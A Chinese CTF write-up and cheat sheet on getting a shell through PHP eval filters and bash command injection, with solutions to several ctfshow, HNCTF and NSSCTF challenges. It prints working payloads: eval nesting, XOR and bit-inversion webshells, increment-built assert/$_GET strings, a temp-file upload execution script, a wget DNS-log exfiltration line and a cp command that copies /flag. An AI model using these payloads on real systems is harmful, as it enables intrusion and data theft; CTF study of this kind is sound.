## 通过**Nssctf round5**的一道题总结下自己的getshell

目前会的最多的是php的**getshell**
了解一点python的**getshell**
第三种就是通用的**bashshell**
其它待补充

## phpGetshell

**php最常见的就是eval+过滤**

### 套！

很实用的一种用法，当正则过滤实在过多无法绕过时就可考虑靠一层

> **web31**
>
> ```php
> <?php
> error_reporting(0);
> if(isset($_GET['c'])){
>     $c = $_GET['c'];
>     if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
>         eval($c);
>     }
>     
> }else{
>     highlight_file(__FILE__);
> }
> ```
>
> 过滤了空格，命令行函数可能直接用不了
>
> 可以嵌套一下
>
> **GET:**`?c=eval($_POST[1]);`
>
> **POST:**`1=phpinfo();`
>
> 没过滤就很轻松了

### 绕！

常见的过滤基本都已经有了对应的绕过方法
一般来说就是
1.找函数代替
2.绕过正则(超出正则匹配最大限度 数组变量 变量名前加空格)
**==**

### disabled!

disabled函数一般都是找其他函数绕过，在ctfshow里已经有了完整的介绍

或者利用蚁🗡的绕过disabled的插件(不保证都可以)

### 无字母数字

#### 上传文件

利用php服务器的特性，对服务器上传文件后会存储到**/tmp/phpxxxxxX**中(最后一位一般是大写字母)
然后利用**. 小数点**命令来执行就可执行该php文件

```python
import requests

__AUTHOR__ = "h1xa"

url = "http://127.0.0.1:8888/upload"


def getFlag():
  file={
  "file":"cat /f*>/var/www/html/1.txt"
  }

  data={
    "cmd":". /t*/*"
  }
  response = requests.post(url=url+"api/tools.php",files=file,data=data)
  if "t*" in response.text:
    print("执行成功，检查回显...")
  response = requests.get(url=url+"1.txt")
  if response.status_code == 200:
    print("flag 获取成功 "+response.text)
  else:
    print("flag 获取失败")

if __name__ == '__main__':
  getFlag()
```

可根据实际需要进行更改

#### 异或

过滤了数字和字母，但没过滤一些符号或者不可见字符，所以可用这些符号异或出所以的字母和数字
具体脚本(稍微改改基本都能用)

```python
# -*- coding: utf-8 -*-
import requests
import urllib
from sys import *
import os
os.system("php rce_or.php")
if(len(argv)!=2):
   print("="*50)
   print('USER：python exp.py <url>')
   print("eg：  python exp.py http://ctf.show/")
   print("="*50)
   exit(0)
url=argv[1]
def action(arg):
   s1=""
   s2=""
   for i in arg:
       f=open("rce_or.txt","r")
       while True:
           t=f.readline()
           if t=="":
               break
           if t[0]==i:
               #print(i)
               s1+=t[2:5]
               s2+=t[6:9]
               break
       f.close()
   output="(\""+s1+"\"|\""+s2+"\")"
   return(output)
   
while True:
    param=action(input("\n[+] your function：") )+action(input("[+] your command："))
    data='?code='+urllib.parse.unquote(param)+';'
    r=requests.get(url=url+data)
    print("\n[*] result:\n"+r.text)
    print(data)
    print(param)
```

```php
<?php
$myfile = fopen("rce_or.txt", "w");
$contents="";
for ($i=0; $i < 256; $i++) { 
	for ($j=0; $j <256 ; $j++) { 

		if($i<16){
			$hex_i='0'.dechex($i);
		}
		else{
			$hex_i=dechex($i);
		}
		if($j<16){
			$hex_j='0'.dechex($j);
		}
		else{
			$hex_j=dechex($j);
		}
		$preg = '/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i';
		if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
					echo "";
    }
  
		else{
		$a='%'.$hex_i;
		$b='%'.$hex_j;
		$c=(urldecode($a)|urldecode($b));
		if (ord($c)>=32&ord($c)<=126) {
			$contents=$contents.$c." ".$a." ".$b."\n";
		}
	}

}
}
fwrite($myfile,$contents);
fclose($myfile);
```

#### **取反**

[取反或者异或绕过](https://blog.csdn.net/mochu7777777/article/details/104631142)

> **取反马**
>
> ```php
> <?php
> echo urlencode(~'assert').'\n';
> echo urlencode(~'eval($_POST[1])');
> ?>
> %9E%8C%8C%9A%8D%8B
> %9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6
> ?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6);
> ```
>

还可以汉字取反

#### 递增构造

这得借助PHP的一个小技巧：[参见文档](https://www.php.net/manual/zh/language.operators.increment.php)

也就是说`'a'++ =>'b','b'++ =>'c'` 只能 ++ 不能 -- 更不能直接加数字

在无字母中得到字母也有办法

```php
$_.=[];  //$_='Array' $_[0]='A'
```

这样就可以构造出所有的字母

例：

```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E 
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```

### 例题

#### 递增构造

##### shellme_Revenge[ctfshow吃瓜杯]

只有一个phpinfo，可以看到hint

```php
hint=?looklook
```

输入`?hint=1`的带源码

```php
<?php
error_reporting(0);
if ($_GET['looklook']){
    highlight_file(__FILE__);
}else{
    setcookie("hint", "?looklook", time()+3600);
}
if (isset($_POST['ctf_show'])) {
    $ctfshow = $_POST['ctf_show'];
    if (is_string($ctfshow) || strlen($ctfshow) <= 107) {
        if (!preg_match("/[!@#%^&*:'\"|`a-zA-BD-Z~\\\\]|[4-9]/",$ctfshow)){
            eval($ctfshow);
        }else{
            echo("fucccc hacker!!");
        }
    }
} else {

    phpinfo();
}
?>
```

直接利用递增构造出rce

```php
<?php
$_=C;
$_++; //D
$C=++$_; //E
$_++; //F
$C_=++$_; //G
$_=(C/C.C){0}; //N
$_++; //O
$_++; //P
$_++; //Q
$_++; //R
$_++; //S
$_=_.$C_.$C.++$_; //_GET
($$_{1})($$_{2}); //($_GET{1})($_GET{2})
```

过滤了`system exec shell_exec`，看别人的wp发现还有`passthru`

用这个函数**rce**就好了

这题没有过滤斜杠，还可以用`0/0`得到`NAN`方便构造

##### Challenge__rce[HNCTF]

传?hint看到源码

```php
<?php
error_reporting(0);
if (isset($_GET['hint'])) {
    highlight_file(__FILE__);
}
if (isset($_POST['rce'])) {
    $rce = $_POST['rce'];
    if (strlen($rce) <= 120) {
        if (is_string($rce)) {
            if (!preg_match("/[!@#%^&*:'\-<?>\"\/|`a-zA-Z~\\\\]/", $rce)) {
                eval($rce);
            } else {
                echo("Are you hack me?");
            }
        } else {
            echo "I want string!";
        }
    } else {
        echo "too long!";
    }
}
```

与上题相比没过滤数字，但是符号更多了，而且长度有限制，`/`也被过滤了
构造出`_get`是可以的，但是php对这个的大小写是敏感的(一般函数是不敏感的)，所以不行
构造`_GET`，只有一个大小A，想了很多办法减少字符串的数量都是超过

后来还是比照两题的区别

**这题给出所有数字的原因是什么呢？**

**给出来了一定有用~**

于是想到了一个函数  **chr**

chr加上数字就可以构造出所有的字母，而`Array`里面`r`有了，只需要构造`ch`就好了

```php
<?php
$_0.=[];
$_=$_0[3];
$_++;
$__.=++$_;
$_++;$_++;$_++;$_++;
$__.=++$_.$_0[1];//chr
$_=_.$__(71).$__(69).$__(84);//_GET


#rce=%24_0.%3D%5B%5D%3B%24_%3D%24_0%5B3%5D%3B%24_%2B%2B%3B%24__.%3D%2B%2B%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__.%3D%2B%2B%24_.%24_0%5B1%5D%3B%24_%3D_.%24__(71).%24__(69).%24__(84)%3B%24%24_%5B1%5D($$_[0])%3B
```

payload **url编码** 一下之后就随意RCE了

## bashshell

pythonshell其实一般就是bashshell了(我要讲的)

基本上都是纯纯的过滤~

1.**l\s**绕过函数过滤

2.短命令执行在七夕杯的wp中写的很详细了

3.`< 、<>、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS`等等绕过空格

4.**wget**或者**ping**配合dnslog获得信息

```
wget `ls`.xxx.dns.log
```



### 题解

```python
from flask import Flask, request, make_response 
import uuid 
import os 
#flag in /flag 
app = Flask(__name__) 
def waf(rce): 
    black_list = '01233456789un/|{}*!;@#\n`~\'\"><=+-_ ' 
    for black in black_list: 
        if black in rce: 
            return False 
    return True 
@app.route('/', methods=['GET']) 
def index(): 
    if request.args.get("Ňśś"): 
        nss = request.args.get("Ňśś") 
    if waf(nss): 
        os.popen(nss) 
    else: 
        return "waf" 
    return "/source"
@app.route('/source', methods=['GET']) 
def source(): 
    src = open("app.py", 'rb').read() 
    return src 



if __name__ == '__main__': app.run(host='0.0.0.0', debug=False, port=8080)
```

过滤了很重要的`/`而flag又在/flag中，所以本题一开始我就想着怎么反弹shell了
后面也发现了确实不行。。。
一位师傅给出的payload

```
cp%09%24%28cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26echo%09%24%28pwd%29flag%29%09app%2Epy

解码后
cp	$(cd	..&&cd	..&&cd	..&&cd	..&&cd	..&&cd	..&&cd	..&&cd	..&&echo	$(pwd)flag)	app.py

讲下要点
cd .. 和 cd ../ 一样是返回上级目录
$() 和 `` 一样，里面是一个bash命令
本题先用$()套住一个bash，然后cd到主目录，再用$(pwd)获取当前目录，也就是 / !!!!!
最后复制到app.py
然后flask的尿性我也不懂，有时候保存后服务器就重启，有时候要重开
本题也就是要重开所以就没有关闭服务器
然后查看 /source 得到flag
```

